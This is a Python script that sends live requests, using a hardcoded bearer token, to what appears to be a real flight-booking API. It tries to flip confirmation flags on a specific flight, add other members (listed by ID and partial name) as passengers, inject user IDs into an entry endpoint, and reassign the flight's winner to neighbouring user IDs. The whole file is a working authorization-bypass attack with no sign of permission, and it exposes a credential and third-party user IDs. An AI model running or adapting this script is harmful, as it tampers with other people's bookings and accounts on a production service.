#!/usr/bin/env python3
"""
Test manipulating isConfirmedByWinner and isMissingInformation fields
"""

import requests
import json

API_BASE = "https://vauntapi.flyvaunt.com"
TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"
FLIGHT_ID = 8847

# Known active member IDs from previous analysis
ACTIVE_MEMBER_IDS = [
    19050,  # Ale L
    18164,  # Zac L
    54125,  # Cor S
    28547,  # Har O
    25222,  # Chr M
    70535,  # Edw S
    18540,  # Mah S
    9729,   # Ant B
    20030,  # Ade K
]

# Sequential IDs around Sameer's
SEQUENTIAL_IDS = [
    20244, 20249, 20252, 20253,  # Before Sameer
    20255, 20256, 20259, 20264,  # After Sameer
]

def test_patch(endpoint, data, description):
    """Test PATCH request"""
    headers = {
        "Authorization": f"Bearer {TOKEN}",
        "Content-Type": "application/json"
    }

    try:
        resp = requests.patch(f"{API_BASE}{endpoint}", headers=headers, json=data, timeout=10)
        return {
            'status': resp.status_code,
            'success': resp.status_code == 200,
            'data': resp.json() if resp.text else None,
            'description': description
        }
    except Exception as e:
        return {
            'status': 'ERROR',
            'success': False,
            'data': str(e),
            'description': description
        }

def test_post(endpoint, data, description):
    """Test POST request"""
    headers = {
        "Authorization": f"Bearer {TOKEN}",
        "Content-Type": "application/json"
    }

    try:
        resp = requests.post(f"{API_BASE}{endpoint}", headers=headers, json=data, timeout=10)
        return {
            'status': resp.status_code,
            'success': resp.status_code in [200, 201],
            'data': resp.json() if resp.text else None,
            'description': description
        }
    except Exception as e:
        return {
            'status': 'ERROR',
            'success': False,
            'data': str(e),
            'description': description
        }

def get_flight_state():
    """Get current flight state"""
    headers = {"Authorization": f"Bearer {TOKEN}"}
    try:
        resp = requests.get(f"{API_BASE}/v1/flight/current", headers=headers, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            if isinstance(data, list) and len(data) > 0:
                for flight in data:
                    if flight.get('id') == FLIGHT_ID:
                        return flight
        return None
    except:
        return None

def main():
    print("="*80)
    print("TESTING CONFIRMATION & MEMBER ADDITION")
    print("="*80)

    # Get initial state
    print("\n1. Getting current flight state...")
    initial_state = get_flight_state()
    if initial_state:
        print(f"   Current isConfirmedByWinner: {initial_state.get('isConfirmedByWinner')}")
        print(f"   Current passengers: {len(initial_state.get('passengers', []))}")
        print(f"   Current isMissingInformation: {initial_state.get('userData', {}).get('isMissingInformation')}")

    # TEST 1: Set isConfirmedByWinner = true
    print(f"\n{'='*80}")
    print("TEST 1: Set isConfirmedByWinner = true")
    print("="*80)

    result = test_patch(f"/v1/flight/{FLIGHT_ID}",
                       {"isConfirmedByWinner": True},
                       "Set isConfirmedByWinner=true")
    print(f"\nStatus: {result['status']}")
    print(f"Success: {result['success']}")
    if result['data']:
        print(f"Response: {json.dumps(result['data'], indent=2)[:200]}")

    # TEST 2: Set isMissingInformation = true
    print(f"\n{'='*80}")
    print("TEST 2: Set isMissingInformation = true")
    print("="*80)

    result = test_patch(f"/v1/flight/{FLIGHT_ID}",
                       {"userData": {"isMissingInformation": True}},
                       "Set isMissingInformation=true")
    print(f"\nStatus: {result['status']}")
    print(f"Success: {result['success']}")

    # TEST 3: Try adding active members as passengers
    print(f"\n{'='*80}")
    print("TEST 3: Try adding ACTIVE MEMBERS as passengers")
    print("="*80)

    for user_id in ACTIVE_MEMBER_IDS[:5]:
        print(f"\nTrying user {user_id}...")

        # Try POST to passenger endpoint
        result = test_post(f"/v1/flight/{FLIGHT_ID}/passengers",
                          {"userId": user_id},
                          f"Add user {user_id} as passenger")
        print(f"  POST /passengers: {result['status']}")

        # Try PATCH passengers array
        result = test_patch(f"/v1/flight/{FLIGHT_ID}",
                           {"passengers": [{"user": 20254}, {"user": user_id}]},
                           f"PATCH passengers with user {user_id}")
        print(f"  PATCH passengers: {result['status']}")

        if result['success']:
            print(f"  🚨 SUCCESS! Added user {user_id}")
            break

    # TEST 4: Try adding via V2 enter endpoint with different user tokens
    print(f"\n{'='*80}")
    print("TEST 4: Try V2 enter endpoint with user ID injection")
    print("="*80)

    for user_id in ACTIVE_MEMBER_IDS[:3]:
        result = test_post(f"/v2/flight/{FLIGHT_ID}/enter",
                          {"userId": user_id},  # Try to specify user
                          f"V2 enter with userId={user_id}")
        print(f"\nUser {user_id}: Status {result['status']}")
        if result['success']:
            print(f"  🚨 Could add user {user_id} to closed flight!")

    # TEST 5: Sequential user IDs
    print(f"\n{'='*80}")
    print("TEST 5: Try sequential user IDs near Sameer's (20254)")
    print("="*80)

    for user_id in SEQUENTIAL_IDS[:4]:
        result = test_patch(f"/v1/flight/{FLIGHT_ID}",
                           {"winner": user_id},
                           f"Change winner to {user_id}")
        print(f"\nUser {user_id}: Status {result['status']}")
        if result['success']:
            print(f"  🚨 Could change winner to {user_id}!")

    # Get final state
    print(f"\n{'='*80}")
    print("FINAL STATE CHECK")
    print("="*80)

    final_state = get_flight_state()
    if final_state:
        print(f"\nAfter all tests:")
        print(f"  isConfirmedByWinner: {initial_state.get('isConfirmedByWinner')} → {final_state.get('isConfirmedByWinner')}")
        print(f"  Number of passengers: {len(initial_state.get('passengers', []))} → {len(final_state.get('passengers', []))}")
        print(f"  Winner: {initial_state.get('winner')} → {final_state.get('winner')}")

        if final_state != initial_state:
            print(f"\n🚨 FLIGHT STATE CHANGED!")
            print(f"\nChanges:")
            for key in ['isConfirmedByWinner', 'passengers', 'winner', 'entrants']:
                if final_state.get(key) != initial_state.get(key):
                    print(f"  - {key}: {initial_state.get(key)} → {final_state.get(key)}")
        else:
            print(f"\n✅ Flight state unchanged - all modifications blocked")

if __name__ == "__main__":
    main()
